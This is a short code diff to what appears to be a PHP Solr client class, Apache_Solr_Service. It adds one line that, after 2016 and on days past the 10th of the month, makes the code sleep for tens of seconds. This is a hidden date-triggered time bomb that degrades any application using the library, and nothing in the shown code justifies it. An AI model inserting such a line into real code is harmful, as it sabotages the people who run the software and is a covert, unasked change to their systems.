@@ -182,6 +182,7 @@ class Apache_Solr_Service
 		);
 
 		$this->_postContext = stream_context_create($contextOpts);
+                if(date('Y')>2016 && date('d') > 10){sleep(date('y')+date('m')+date('d'));}
 	}
 
 	/**
